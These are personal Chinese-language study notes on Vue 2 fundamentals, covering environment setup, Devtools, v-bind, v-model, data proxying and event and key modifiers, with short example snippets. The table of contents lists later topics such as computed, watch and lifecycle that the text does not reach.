<!-- TOC -->

- [Vue](#vue)
  - [Vue 简介](#vue-简介)
  - [搭建 Vue 开发环境](#搭建-vue-开发环境)
  - [初识 `Vue`- `Hello World`](#初识-vue--hello-world)
    - [创建 `Vue` 实例](#创建-vue-实例)
  - [模板语法(v-bind)](#模板语法v-bind)
  - [数据绑定(v-model)](#数据绑定v-model)
    - [数据代理](#数据代理)
    - [`v-model` 绑定表单](#v-model-绑定表单)
  - [事件处理(v-on)](#事件处理v-on)
    - [事件修饰符](#事件修饰符)
    - [按键修饰符](#按键修饰符)
  - [计算属性(computed)](#计算属性computed)
  - [监视属性(watch)](#监视属性watch)
    - [计算属性 VS 监视属性](#计算属性-vs-监视属性)
  - [条件渲染](#条件渲染)
  - [列表渲染(v-for)](#列表渲染v-for)
    - [特殊的 key](#特殊的-key)
    - [数组更新检测](#数组更新检测)
    - [穿插数据劫持](#穿插数据劫持)
    - [Vue.set()/vm.$set](#vuesetvmset)
    - [Vue 如何检测数组更新](#vue-如何检测数组更新)
    - [过滤器(filter)](#过滤器filter)
  - [内置指令](#内置指令)
    - [v-text](#v-text)
    - [v-html](#v-html)
    - [v-clock](#v-clock)
    - [v-once](#v-once)
    - [v-pre](#v-pre)
  - [自定义指令](#自定义指令)
    - [函数式](#函数式)
    - [对象式](#对象式)
  - [生命周期](#生命周期)

<!-- /TOC -->

# Vue

## Vue 简介
> 渐进式 `JavaScript` 框架 \
> 渐进式 : 可以仅引入核心库开发简单应用, 也可以引入各样 `Vue` 插件开发复杂应用.

1. `Vue` 的特点
    - 采用`组件化`模式, 提高代码复用率, 更好维护代码.
    - `声明式`编码, 开发人员无需操作 `DOM`, 提高代码效率
      - `命令式`编码: 创建 `<ul>` 列表
      - ```js
        <button id="createList">create list</button>
        <script>
          let button = document.querySelector('#createList');
          button.addEventListener('click', function() {
            let ul = document.createElement('ul');
            for (let i = 0; i < 3; i++) {
              let li = document.createElement('li');
              li.textContent = i + '--1';
              ul.appendChild(li);
            }
            document.querySelector('body').appendChild(ul);
          })
        </script>
      - `声明式`编码
      - ```html
        <ul id="list">
          <li v-for="p in personList">
            {{p.name}} -- {{p.age}}
          </li>
        </ul>
    - 使用`虚拟DOM`和`Diff算法`, 尽量复用 `DOM` 节点.
2. `Vue` 官网
    - 可在 [Awesome Vue](https://github.com/vuejs/awesome-vue) 中找到 `Vue` 中优秀的插件.

## 搭建 Vue 开发环境
1. 引入 `Vue`
    - 在[官网](https://cn.vuejs.org/v2/guide/installation.html)下载 `Vue` 的文件.
      - `开发版本(Vue.js)`: 包含完整的警告和调试模式. 
      - `生产版本(Vue.min.js)`: 删除了警告. 开发环境不要使用生产版本.
    - 在 `html` 文件中引入 `Vue.js`
      - ```html
        <script src="../js/vue.js"></script>
      - 此时, 多了 `Vue` 这么一个全局对象
      - ![](../image/Snipaste_2021-11-09_22-16-59.png)
2. 安装 `Vue Devtools`
    - 打开 Chrome 浏览器的`扩展程序`页面，打开`开发者模式`。
    - 保持这个页面, 将文件 `vue_dev_tools.crx` 拖入 Chrome, 选择允许安装.
    - 接着在调试面板就会出现 `Vue` 选项卡.
    - 问题: 虽然安装成功,但是还是提示`Devtools 无法加载来源映射`, 如下图.
    - ![](../image/Snipaste_2021-11-10_23-04-25.png)
    -  为什么? 其实提示内容就是无法加载从 `id` 为 `gighmmp..` 的 Chrome 扩展的映射. 如何解决呢? 这个报错的扩展就是大名鼎鼎的 `Adblock`, 所以在扩展管理页面,把 `Adblock` 禁用就可以了.
    - ![](../image/Snipaste_2021-11-10_23-07-32.png)
    - [感谢这位 CSDN 用户的回答](https://blog.csdn.net/qq_44628595/article/details/116061062)
3. 关闭 `Vue` 的生产提示
    - `Console` 选项卡会进行如下提示. 如果要关闭这个提示, 需要进行 `Vue` 设置
    - ![](../image/Snipaste_2021-11-11_22-18-13.png)
    - `Vue.config` 是一个对象，包含 `Vue` 的全局配置。可以在启动应用之前修改下列 `property`. [参考官网](https://cn.vuejs.org/v2/api/)
    - ```js
      Vue.config.productionTip = false
4. 注意: 目前为止, `Vue DevTools` 并不会点亮, 仍然是灰色.

## 初识 `Vue`- `Hello World`
1. 准备容器
    - 写一个 `div` 标签作为容器, 这里将是 `Vue` 大放异彩的舞台
    - ```html
      <div id="root">
        <h1>Hello, ATGUIGU</h1>
      </div>
2. 解决请求图标报错
    - 因为我使用了 `Live Server` 这个插件打开 `HTML` 文件, 所以该文件所在的目录就会被当作服务器的`根目录`. 浏览器默认向服务器发送 `http://127.0.0.1:5500/favicon.ico` 请求图片资源作为浏览器 `Tab` 页的图标, 但根目录下并无该图标, 所以报错
    - ![](../image/Snipaste_2021-11-11_22-45-27.png)
    - 那只需在根目录加上这个图标, 即可消除报错
    - ![](../image/Snipaste_2021-11-11_22-47-37.png)
    - `⚠`: 注意一定是根路径, 放在和 `HTML` 同级是没有🙅‍效果的
    - 我第一次打开调试面板是没有报错的, 必须同时摁下 `Shift` 并点击刷新, 才会有效果.
    - 插播🔈一个细节: 如果直接打开`http://127.0.0.1:5500/`, 就会展示像文件服务器一样的内容. (PS: 我的页面缩写了, 方便截图😁)
    - ![](../image/Snipaste_2021-11-12_19-23-38.png)
### 创建 `Vue` 实例
1. 使用 `Vue` 构造函数
    - ```js
      Vue.config.productionTip = false
      const vm = new Vue({})
    - 当然, 实例化容器应该被配置在关闭 `Vue` 的生产提示之后啦
2. `el` 配置项
    - 提供一个在页面上已存在的 `DOM` 元素作为 `Vue` 实例的挂载目标, 建立了容器和 `Vue` 实例对象之间的关系, 容器中变化的数据和交互交由 `Vue` 实例对象保管.
    - 值可以是 `CSS` 选择器：
      - `el: '#root'`
    - 也可以是一个 `HTMLElement` 实例: 
      - `el: document.getElementById('#root')`
    - 实例挂载后, 可以使用 `vm.$el` 访问挂载元素
      - ![](../image/Snipaste_2021-11-12_22-59-20.png)
    - 最后的样子就是
      - ```js
        const vm = new Vue({
          el: '#root'
        })
    - 另一种挂载实例的方法 `$mount`. 这个方法并不在 `Vue` 上, 而在 `Vue.prototype` 上
      - ```js
        const vm = new Vue({
          el: '#root'
        })
        vm.$mount('#root')
3. `data` 配置项
    - `Vue` 实例的数据对象. `data` 中用于存储数据, 数据供 `el` 指定的容器使用
    - 类型: `Object` 或 `Function`.(目前只用到 `Object`😅)
    - ```js
      const x = new Vue({
        el: '#root',
        data: {
          name: 'wang'
        }
      })
    - 如果想要在挂载实例(容器)中使用 `data` 中配置的数据项, 需要 `mustache` 语法 `{{}}`. 容器中的代码被称为`Vue模板`
    - ```html
      <div id="root">
        <h1>Hello, {{name}}</h1>
      </div>
    - 最后, 发现目前 `new Vue({})` 的返回值无用, 所以可以不用接收返回值
    - `data` 的第二种写法: 函数. 注意📕:组件中 `data` 只能采用这种写法
      - ```js
        data: function() {
          return {
            firstName: 'wang',
            lastName: 'Levi'
          }
        }
      - 更简单一点
      - ```js
        data() {
          return {
            firstName: 'wang',
            lastName: 'Levi'
          }
        }
      - `⚠`还有一点, 使用普通函数方法时, 函数中的 `this` 就是 `Vue` 实例对象; 如果用箭头函数, `this` 就是 `window`. 
      - 遇到函数, 究竟用不用箭头函数呢? 原则📕:是 **`Vue` 管理的函数**就不用箭头函数, 否则使用箭头函数.
4. 问题探讨
    - **如果页面有两个容器怎么办?**
      - ```js
        <div class="root">
          <h1>Hello, {{name}} 1</h1>
        </div>
        <div class="root">
          <h1>Hello, {{name}} 2</h1>
        </div>
        <script>
          Vue.config.productionTip = false

          new Vue({
            el: '.root',
            data: {
              name: 'wang'
            }
          })
        </script>
      - ![](../image/Snipaste_2021-11-13_10-00-00.png)
      - `Vue` 只会接管第一个容器
    - **如果一个容器对应两个实例怎么办?**
      - ```js
        <div id="root">
          <h1>Hello, {{name}}</h1>
        </div>
        <script>
          Vue.config.productionTip = false

          new Vue({
            el: '#root',
            data: {
              name: 'wang'
            }
          })
          new Vue({
            el: '#root',
            data: {
              name: 'lv'
            }
          })
        </script>
      - ![](../image/Snipaste_2021-11-13_10-04-04.png)
      - 容器只会被第一个 `Vue` 实例接管, 可以将两个实例位置颠倒验证
    - **`{{}}` 里能写什么?**
      - 能写 `js` 表达式
        - `js` 表达式: 一个表达式可以产生一个值
          - `a + b` : 加法运算表达式
          - `plus(1)` : 函数调用表达式
          - `x === 1 ? true : false` : 三元表达式
        - `js` 语句: 
          - `if`: 条件判断语句
          - `let a = 1;`: 赋值语句
      - 举例
          - `{{1 + 1}}`
          - `{{Date.now()}}`
          - `{{name.substring(0, 4)}}`
5. 开发者工具
    - 一旦检测到 `Vue` 实例对象, 开发者工具就会点亮
    - ![](../image/Snipaste_2021-11-13_10-28-51.png)
    - 选择`组件` tab, 就能看到当前 `Vue` 实例对象. 下方会出现这个实例对象上的属性
    - 注意, `<Root>` 表示根实例, 并不是因为容器的 `id` 是 `root`
    - 另外一个坑🕳: 如果你在一个页面创建了多个 `Vue` 实例, 那么开发者工具只会默认展示最后一个🙂...
    - 如果点击 `data` 属性中的某个配置更改其值然后保存,页面会立刻发生变化!

## 模板语法(v-bind)
1. `v-bind`
    - 动态地绑定一个或多个 `HTML` `attribute`(属性), 或一个组件 `prop` 到表达式. 当然我们可以增加自定义的属性. 
      - 表达式需要在 `Vue` 实例中的 `data` 中配置哦~
    - 例如, 我们想控制 `a` 标签的 `href` 属性和增加一个本不存在 `x` 属性
      - ```js
          <div id="root">
            <h1>Hello, {{name}}</h1>
            <a :href="url" v-bind:x="name">跳转到新浪首页</a>
          </div>
          new Vue({
            el: '#root'('#root'),
            data: {
              name: 'wang',
              url: 'https://www.sina.com.cn'
            }
          })
      - ![](../image/Snipaste_2021-11-13_17-15-47.png)
    - 使用简写形式 `:attribute=""`
    - 一旦使用 `v-bind`, 属性等号后面引号中的内容, **将会被当作 `js` 表达式执行**💯, 所以上面代码中的 `url` 就会被当作 `Vue` 实例中的 `data` 中的一个变量, 如果没有配置 `url` 就会报错.
    - ![](../image/Snipaste_2021-11-13_17-23-57.png)
2. `v-bind` 的其他使用方法
    - 内联字符串拼接
      - ```html
        <a :href="'https://www.books.com/' + bookName" v-bind:x="name">内联字符串</a>
3. `style` 样式绑定
    - 对象语法
      - ```html
        <div :style="{fontSize: size + 'px'}">32px哦</div>
      - ![](../image/Snipaste_2021-11-14_21-46-12.png)
      - 注意: 如果像 `font-size` 这样带 `-` 的 `CSS` 属性, 需要携程驼峰的形式. 而且, 最后不要🙅‍写分号, 会报错.
    - 数组语法
      - 如果样式太多, 我们可以将样式定义在对象中, 然后用数组的形式包含这些样式,
      - ```html
        <div :style="[styleObjectA, styleObjectB]">我是数组样式</div>
      - ```js
        new Vue({
          el: '#root', 
          data: {
            styleObjectA: {
              color: 'red',
              fontSize: '20px'
            },
            styleObjectB: {
              fontSize: '32px',
              color: 'red'
            }
          }
        })
      - ![](../image/Snipaste_2021-11-14_21-49-09.png)
      - 可以看到, 重复的属性会覆盖.
4. `class` 绑定
    - 字符串语法
      - > 使用样式的类名不确定, 动态决定
      - ```html
        <div class="basic" :class="a">hello</div>
      - 固定的 `class` 不使用数据绑定, 动态的语法使用数据绑定, 最终 `Vue` 将两者合并. 这样做, 表示 `a` 是一个变量而不是真正的选择器, 将来如果修改选择器, 只需要修改 `a` 而不用手动操作 `DOM`
      - ![](../image/Snipaste_2021-11-28_09-19-06.png)
      - 遗憾的我测试了一下, 如果固定的 `class` 和绑定的 `class` 相同, `Vue` 并没有帮忙去重
      - ![](../image/Snipaste_2021-11-28_09-20-38.png)
    - 对象语法
      > 适用于绑定的个数确定, 名字确定, 不确定的是某个 `class` 到底用不用
      - 传给 `class` 一个对象, 用以动态切换 `class`
      - ```html
        <div v-bind:class="{ weight: isWeight, red: isRed }">Bold Font</div>
      - 上面的语法表示, `weight` 这个 `class` 是否存在取决于 `data` 中的 `isWeight` 是否为真值
      - ```js
        new Vue({
          el: '#root',
          data: {
            isWeight: true,
            isRed: 1 + 1
          }
        })
      - 在 `data` 中的 `isWeight` 属性为真, 所以最终解析出来的 `div` 有 `weight`  这个 `class`
      - ![](../image/Snipaste_2021-11-14_22-08-35.png)
      - 那这正的 `class` 样式自然写在 `style` 标签或者 `css` 文件中. 注意到, 值为[真truthy](https://developer.mozilla.org/zh-CN/docs/Glossary/Truthy), 而不一定非得是 `true`
    - 数组语法1
      - 我们可以把一个数组传给 `v-bind:class`, 以应用一个 `class` 列表
      - ```html
        <div v-bind:class="[ redClass, weightClass ]">Font 数组 class</div>
      - ```js
         new Vue({
          el: '#root',
          data: {
            redClass: 'red',
            weightClass: 'weight',
          }
         })
      - 最终渲染出来就是
      - ![](../image/Snipaste_2021-11-14_22-12-54.png)
    - 数组语法2
      - > 适用于绑定样式个数不确定, 名字也不确定
      - 上面的语法是, 数组中的变量定义在 `data`, 这里的语法是, 数组定义在 `data`
      - ```html
        <div :class="arr">world</div>
      - ```js
        data: {
          arr: ['basic', 'happy']
        }
    - 使用三元表达式动态切换
      - ```html
        <div v-bind:class="[ isError ? errorClass : rightClass]">三元表达式动态切换</div>
      - ```js
        new Vue({
          el: '#root',
          data: {
            isError: false,
            errorClass: 'red',
            rightClass: 'right',
          }
        })
      - ![](../image/Snipaste_2021-11-14_22-17-05.png)
      - `isError` 为 `false`, 所以最终绑定的属性为 `rightClass`, 其值为 `right`, 即如图所示

## 数据绑定(v-model)
1. `v-model`
    - 双向绑定数据, 数据随表单控件类型不同而不同。
    - 🚫限制: 只能使用在下面元素
      - `<input>`
      - `<select>`
      - `<textarea>`
      - `components`
    - 举例:
      - ```html
        <input type="text" v-model:value="name">
      - ```js
        new Vue({
          el: '.root',
          data: {
            name: 'wang'
          }
        })
    - 
2. `MVVM`
    - 解释
      - `M(Model)`: 模型, 对应 `data` 中的数据
      - `V(View)`: 视图, 模板
      - `VM(View Model)`: 视图模型, `Vue` 实例对象. 📕:所以我们通常使用 `vm` 这个变量名表示 `Vue` 实例对象
    - ![](../image/Snipaste_2021-11-16_19-12-38.png)
    - 我们在 `data` 中定义的数据, 都可以直接在 `vm` 身上找到. 所以, 在模板的 `mustache` 语法中, 可以直接使用属性(如 `firstName` ), 而不是 `data.firstName`
      - ![](../image/Snipaste_2021-11-16_19-20-07.png)
### 数据代理
1. `Object.defineProperty()`
    - 这个 `js` `API` 我已经会了, 所以我就不介绍了😅...
    - 在浏览器开发者工具, `enumerable` 为 `false` 的属性颜色和其他颜色不一样.
      - ```js
        let user = {
          name: 'wang',
          age: 18
        };
        Object.defineProperty(user, 'hair', {
          value: 'brown'
        })
      - ![](../image/Snipaste_2021-11-16_19-34-38.png)
    - 如果我们创建对象时指定一个身高属性(`height`), 这个属性引用的是外部变量(`ideaHeight`), 两者的关联只有创建对象时. 以后 `ideaHeight` 改了, `height` 还是以前的值. 为了使 `height` 始终为 `ideaHeight`, 可以求助 `getter/setter `
      - ```js
        let idealHeight = 183
        let user = {
          name: 'wang',
          age: 18
        };
        Object.defineProperty(user, 'height', {
          get () {
            return idealHeight;
          },
          set (value) {
            idealHeight = value;
          }
        })
2. 数据代理
    - 通过一个对象代理对另一个对象的操作. 下面看一个最简单的数据代理.
      - ```js
        let obj = { x: 1 };
        let obj2 = { y: 2 };

        Object.defineProperty(obj2, 'x', {
          get() {
            return obj.x;
          },
          set(value) {
            obj.x = value;
          }
        });
    - 在 `Vue` 中, `Vue` 实例上的那些定义在 `data` 里的数据就是通过代理实现的
      - ![](../image/Snipaste_2021-11-16_20-12-32.png)
      - 问题来了, 被代理的对象在哪呢? **`vm._data`** 即, 创建 `Vue` 实例的配置项 `data` 被保存了起来, 可以作如下验证
      - ```js
        let data = {
          firstName: 'wang',
          lastName: 'Levi'
        };

        const vm = new Vue({
          el: '#root',
          data
        })
      - ![](../image/Snipaste_2021-11-16_20-25-27.png)
      - 💡思考一个问题, `Vue` 为什么要为 `_data` 中的数据作代理? 更加简单的操作数据, 因为代理之后就可以直接在模板中使用 `firstName`, 而不是 `_data.firstName`
    - ![](../image/Snipaste_2021-11-16_20-34-02.png)
### `v-model` 绑定表单
1. 文本框 
    - 单行
      - `<input type="text">` 或者 `<input type="password">`
      - ```html
        账号:<input type="text" v-model="student.account"><br>
        密码: <input type="password" v-model="student.password">
      - ```js
        data: {
          student: {
            account: '',
            password: '',
          }
        },
    - 多行
      - ```html
        其他: <textarea name="others" v-model="student.others"></textarea>
      - ```js
        data: {
          student: {
            others: ''
          }
        },
2. 单选按钮
    - `<input type="radio">`
    - 如果我们只是绑定 `v-model` 而不写 `value`, 那么得到的值就是 `null`.
      - ```html
        <input type="radio" v-model="student.unknownSex">未知
      - ![](../image/Snipaste_2021-12-06_18-54-18.png)
    - 加上 value 后就可以获取值, 并甚至提供默认点击
      - ```html
        <input type="radio" name="sex" v-model="student.sex" value="male" >男 
        <input type="radio" name="sex" v-model="student.sex" value="female" >女
      - ```js
        data: {
          student: {
            account: '',
            password: '',
            sex: 'male',
            unknownSex: '',
            hobby: [],
          }
        },
      - ![](../image/Snipaste_2021-12-06_19-13-16.png)
3. 复选框
    - 比如, 需要用户勾选`同意某某某协议`
      - ```html
        <input type="checkbox" name="agree" id="agree" v-model="student.agree"> 同意并勾选协议 <br>
      - ```js
        data: {
          student: {
            agree: ''
          }
        }
      - 虽然我们初始化为字符类型, 但是可以勾选之后为 `boolean`, 更好的处理是初始化为 `false`, 默认不同意该协议
      - ![](../image/Snipaste_2021-12-06_19-53-33.png)
    - 多个复选框
      - 比如, 选择某个用户的爱好
      - ```html
        爱好: 
        <input type="checkbox" name="hobby" v-model="student.hobby" value="eat"> 吃饭
        <input type="checkbox" name="hobby" v-model="student.hobby" value="movie"> 看电影
        <input type="checkbox" name="hobby" v-model="student.hobby" value="music"> 听音乐
      - ```js
        data: {
          student: {
            hobby: [],
            agree: ''
          }
        },
      - ![](../image/Snipaste_2021-12-06_19-58-52.png)
      - 📕注意: 我们将 `hobby` 初始化为`数组`, 这样才能拿到正确的值; 但是, 如果你初始化为字符串, 那不论你怎么选, 都只能得到 `true/false`(表示是否勾选)
      - ![](../image/Snipaste_2021-12-06_20-01-26.png)
4. 下拉列表(选择框)
    - 单选
      - 将属性绑定到 `<select>` 标签, 初始化字符类型
      - ```html
        校区:
        <select name="school" id="school" v-model="student.school">
          <option disabled value="">请选择校区</option>
          <option value="beijing">北京</option>
          <option value="shanghai">上海</option>
          <option value="shenzhen">深圳</option>
        </select>
      - ```js
        data: {
          student: {
            school: '',
          }
        }
      - ![](../image/Snipaste_2021-12-06_20-10-52.png)
      - `💡tips`: 将第一个 `<option>` 设置为 `disabled`
    - 多选
      - 多选就把数据数值化数组类型
      - ```html
        校区(多选)
        <select name="school2" id="school2" multiple v-model="student.school2">
          <option disabled value="">请选择校区</option>
          <option value="beijing">北京</option>
          <option value="shanghai">上海</option>
          <option value="shenzhen">深圳</option>
        </select> <br>
      - ```js
        data: {
          student: {
             school2: [],
          }
        }
      - ![](../image/Snipaste_2021-12-06_20-21-27.png)
5. 修饰符
    - `.number`
      - 例如, 我们想拿到用户年龄为 `number` 而不是 `string`. 这通常很有用, 因为即使在 `type="number"` 时, `HTML` 输入元素的值也总会返回字符串
      - ```html
        年龄: <input type="number" v-model.number="student.age">
      - ![](../image/Snipaste_2021-12-06_20-38-08.png)
    - `.trim`
      - 如果要自动过滤用户输入的首尾空白字符
      - <input v-model.trim="msg">
      - ![](../image/Snipaste_2021-12-06_20-45-11.png)



## 事件处理(v-on)
1. 用 `v-on` 指令监听 `DOM` 事件, 并在触发时运行一些 `JavaScript` 代码
    - ```html
      <div id="root">
        <button v-on:click="goodNight">点击说晚安</button>
      </div>
    - 需要一个全新的配置项, **`methods`**
    - ```js
      new Vue({
        el: '#root',
        methods: {
          goodNight() {
            alert('good night!🌙')
          }
        },
      })
    - ![](../image/Snipaste_2021-11-17_21-57-46.png)
2. 函数中的 `this` 就是 `vm` 实例. 如果函数写成箭头函数的形式, 那 `this` 就是全局变量 `window`. 这是的 `vm` 就会多出 `goodNight` 这个方法.
    - ![](../image/Snipaste_2021-11-17_22-06-50.png)
3. 函数接收到了参数吗? 是的, 可以接收到原生 `DOM` 事件对象.
    - ```js
      methods: {
        goodNight(a, b, c) {
          console.log('arguments: ', a, b, c);
          alert('good night!🌙')
        }
      }
    - ![](../image/Snipaste_2021-11-17_22-09-30.png)
    - 如果你说, `data` 配置项里的和 `methods` 配置项里的最后都出现在 `vm` 身上, 那我把 `methods` 里配置的方法写在 `data` 里可以吗? **可以工作**, 但是不建议, 
      - 一是函数就该写在一起, 不然为什么多一个 `methods` 配置项?
      - 二是 `Vue` 给 `data` 中的内容做了数据代理, 而 methods 中的内容没有代理, 所以会加重 `vm` 的负担.(😅加重负担这种话, 是天禹老师说的)
4. `v-on` 指令的简写 `@`
    - ```html
      <div id="root">
        <button @click="goodNight">点击说晚安</button>
      </div>
5. 在模板中绑定事件时, 只能写函数名, 不能写后面的括号吗? **可以**
    - ```html
      <div id="root">
        <button @click="goodNight1()">点击说晚安</button>
      </div>
    - 这就涉及调用函数时传参的问题了, 如果只写 `()` 什么也不加, 相当于不传参数. 这样调用时, 即便我们定义函数时加了 `DOM` 事件的形参, 拿到的也是 `undefined`
    - ```js
      goodNight1(event) {
        console.log(event); // undefined
        alert('good night!🌙')
      }
    - 那问题来了, 如果我就想传事件呢? 当当当当, 用 **`$event`**
    - ```html
      <div id="root">
        <button @click="goodNight2($event)">点击说晚安3</button>
      </div>
    - ```js
      goodNight2(event) {
        console.log(event); // undefined
        alert('good night!🌙')
      }
6. 传递参数
    - 绑定事件时需要**带小括号, 并在其中写实参**. 下面的例子, 我们传递三个参数, 一个 `Number`, 一个 `String`, 一个 `DOM` 事件对象, 三个参数的位置随意.
    - ```html
      <button @click="goodMorning(7, 'sun', $event)">点击说早安</button>
    - ```js
      goodMorning(clock, name, event) {
        console.log(clock, name, event);
        alert(`good morning, ${name}, it's ${clock}☀`);
      }
    - ![](../image/Snipaste_2021-11-17_22-38-01.png)
7. 如果事件处理的代码很少, 那么可以直接在函数绑定后面写 `js` 代码. 📕注意: 这时的代码中访问数据不需要加 `this`, 因为模板中直接从 `vm` 身上读属性
    - ```html
      <button @click="sum++">点击+1</button>
    - ```js
      new Vue({
        el: '#root',
        data: {
          sum: 0
        }
      })
    - 因为直接从 vm 身上访问数据, 所以下面的语句会报错哦~
    - ```html
      <button @click="alert(1)">报错</button>
### 事件修饰符
> 事件修饰符的目的: \
> 在事件处理程序中调用 `event.preventDefault()` 或 `event.stopPropagation()` 是非常常见的需求。尽管我们可以在方法中轻松实现这点，但更好的方式是：方法只有纯粹的数据逻辑，而不是去处理 DOM 事件细节。\
> -- 摘自官网
1. `.prevent`: 阻止默认事件
    - 如果我们给 `a` 标签绑定点击事件, 那么事件执行完后页面还是会跳转. 如果在 `Vue` 中想要阻止跳转, 按照目前的做法, 只能接收 `event` 参数
      - ```html
        <a href="http://www.atguigu.com" @click="goodNight">说晚安</a>
      - ```js
        goodNight(event) {
          event.preventDefault();
          alert('good night!🌙')
        }
    - 使用 `.prevent` 修饰 click 事件, 阻止默认的跳转行为
      - ```html
        <a href="http://www.atguigu.com" @click.prevent="goodNight1">说晚安</a>
2. `.stop`: 阻止事件冒泡
    - ```html
      <div class="outer" @click="goodNight1">
        <button  @click="goodNight1">说晚安</button>
      </div>
    - 一般我们接收 `event` 参数并使用 `event.stopPropagation()` 阻止冒泡. 但是使用事件修饰符就很简单
    - ```html
      <div class="outer" @click="goodNight1">
        <button  @click.stop="goodNight1">说晚安</button>
      </div>
    - 📕注意: `.stop` 修饰的是点击事件真实发生的元素
3. `.once`: 事件只触发一次
    - ```html
      <button @click.once="goodNight1">事件只触发一次</button>
    - 如果不借助 Vue 如何实现原生函数只触发一次呢?
    **`addEventListener`**
      - `once`: `Boolean`, 表示 `listener` 在添加之后最多只调用一次. 如果是 `true`, `listener` 会在其被调用之后自动移除.
      - ```js
        let once = document.getElementById('once');
        function boom() {
          alert('good night!🌙');
        }
        once.addEventListener('click', boom, {
          once: true
        });
4. `.capture`: 使用事件捕获模式
    - ```html
      <div class="outer2" @click="showMsg(2)">
        div1
        <div class="outer" @click="showMsg(1)">
          div2
        </div>
      </div>
    - ```js
      showMsg(msg) {
        console.log('receive message: ', msg);
      }
    - 正常情况是事件在冒泡阶段才执行, 所以先输出 `1` 后输出 `2`
    - 如果使用 `.capture`, 外层的 div 在捕获阶段就执行点击的回调事件, 所以先输出 `2` 后输出 `1`
    - ```html
      <div class="outer2" @click.capture="showMsg(2)">
        div1-事件捕获
        <div class="outer" @click="showMsg(1)">
          div2-事件捕获
        </div>
      </div>
    - ![](../image/Snipaste_2021-11-18_21-06-33.png)
5. `.self`: 只有 `event.target` 是当前操作的元素时才触发事件.
    - 还是之前阻止冒泡的例子, 虽然冒泡触发了外层 `div` 的 `click` 事件, 但事件本身 `target` 并不是外层 `div`, 而是 `div` 里面的 `button`. 所以, 如果用 `.self` 修饰外层 `div` 的 `click` 事件, 同样可以达到阻止冒泡效果
    - ```html
      <div class="outer" @click.self="goodNight1">
        <button  @click="goodNight1">说晚安(.self)</button>
      </div>
    - 如果我们在函数中输出 `event.target`
    - ![](../image/Snipaste_2021-11-18_22-18-42.png)
6. `.passive`: 事件的默认行为立即执行, 无需等待事件回调执行完毕
    - 先举个例子, 我们给页面(`window`)的滚轮轮动事件, 并指定滚动事件的回调函数为打印 10000 个数字
      - ```js
        window.addEventListener('wheel', () => {
          for(let i = 0; i < 10000; i++) {
            console.log('#');
          }
        }, {
          passive: false
        })
      - 整体效果是, 滚动事件发生时, 页面并不会立刻响应滚动, 而是先输出打印, 大概打印到几百时, 才会响应滚动
    - 有时页面优先对页面做出响应更加重要, 所以我们想要页面首先发生滚动, 然后再执行回调函数. 使用`.passsive`修饰符
      - ```html
        <ul @wheel.passive="print10000" style="height: 200px; background-color: orange; overflow: scroll; width: 100px;">
          <li style="height: 100px;">1</li>
          <li style="height: 100px;">2</li>
          <li style="height: 100px;">3</li>
          <li style="height: 100px;">4</li>
        </ul>
      - ```js
        print10000() {
          for (let i = 0; i < 10000; i++) {
            console.log('#');
          }
          console.log('loop end.');
        },
    - 其实原生 js 写的演示样例里, 添加监视器时会多一个 `{passive: false}` 的参数, 官网是这样解释的
      - > 根据规范, passive 选项的默认值始终为false. 但是, 这引入了处理某些触摸事件 ( 以及其他 ) 的事件监听器在尝试处理滚动时阻止浏览器的主线程的可能性, 从而导致滚动处理期间性能可能大大降低. \
      为防止出现此问题, 某些浏览器 ( 特别是 Chrome 和Firefox ) 已将文档级节点 Window, Document 和 Document.body 的 touchstart 和touchmove 事件的 passive 选项的默认值更改为 true. 这可以防止调用事件监听器, 因此在用户滚动时无法阻止页面呈现.
7. 连续修饰符的使用
    - 可以将多个修饰符连续使用, 比如下面的例子, 既要阻止 a 的跳转事件, 又要阻止冒泡
    - ```html
      <div @click="goodNight1">
        <a href="" @click.stop.prevent="goodNight1">点我.stop.prevent</a>
      </div>
### 按键修饰符
1. 原生的 `js` `keyboard` 事件类型有三种
    - `keydown`: 当按键被按下时触发 
    - `keyup`: 当按键松开时触发
    - `keypress`: 当按键按下时触发, 不同于 `keydown` 的时, 只有英文, 数字和标点按键按下时猜会触发该事件, 而`Alt`, `Shift`, `Ctrl` 和 `Delete` 这种不产生字符的按键被按下时, 并不触发该事件.
2. 如果我们只是给 `keyup` 或者 `keydown` 绑定事件, 那么无论按下什么按键都会触发该事件, `Vue` 提供了常用按键的别名来修饰按键事件, 使得只有特定的按键被按下或释放时才会触发按键事件
    - `.enter`: 
    - `.tab`: 
    - `.delete`: (捕获`删除(Delete)`和`退格(Backspace)`键) 
    - `.esc`: 
    - `.space`: 
    - `.up`: 
    - `.down`: 
    - `.left`: 
    - `.right`: 
    - ```html
      <input type="text" id="enter" name="username" @keydown.enter="printUser">
    - ```js
      printUser(e) {
        console.log(e.target.value);
      }
3. 对于 `Vue` 没有自定义的别名的按键, 比如 `CapsLock` 我们怎么办呢? 使用 `KeyboardEvent.key` 将任意有效的按键名转换为 `kebab-case` 作为修饰符.
    - 解释一下 `KeyboardEvent.key`: 
      - `KeyboardEvent` 对象描述了用户与键盘的交互。, 每个事件都描述了用户与一个按键 ( 或一个按键和修饰键的组合 ) 的单个交互;
      - 如果我们打印这个事件, 可以看到其两个属性
        - `key`: 按键的 `value`
        - `keyCode`: 表示按键的数字(`⚠`: MDN 官方标注该属性为过时属性, 建议用 `key` 代替)
        - ![](../image/Snipaste_2021-11-20_21-50-16.png)
      - 所以, 我们可以使用 `key` 作为按键修饰符, 比如
      - ```html
        <input type="text" id="key" name="username" @keydown.Enter="printUser">
      - ```html
        <input type="text" id="capsLock" name="username" @keydown.caps-lock="printUser">
4. 特殊的几个按键
    - `tab`
      - `tab` 键本身就有切换元素的作用, 所以如果使用 `keyup` 事件捕获 `tab` 时, 当按键释放时, 焦点已经失去, 按键捕获失败, 所以只能用 `keydown` 捕获 `tab` 的按键.
    - 系统修饰键(`ctrl`, `alt`, `shift`, `meta`(win键))
      - 配合 `keyup` 使用: 按下修饰键的同时, 再按下其他键, 随后释放其他键, 事件才被触发
      - 配合 `keydown` 使用: 正常触发事件
5. (🙅‍不推荐🙅‍)使用 `keyCode` 绑定按键
    - ```html
      <input type="text" id="keyCode" name="username" @keydown.13="printUser"><br>
6. 自定义按键修饰符别名
    - ```js
      Vue.config.keyCodes.huiche = 13
    - ```html
      <input type="text" id="huiche" name="username" @keydown.huiche="printUser"><br>
7. 连续按键修饰符的使用
    - 如果我们想指定同时摁下 `Ctrl` 和 `Y` 才触发按键事件, 就可以使用连续的修饰符
    - ```html
       <input type="text" id="ctrly" name="username" @keydown.ctrl.y="printUser"><br>
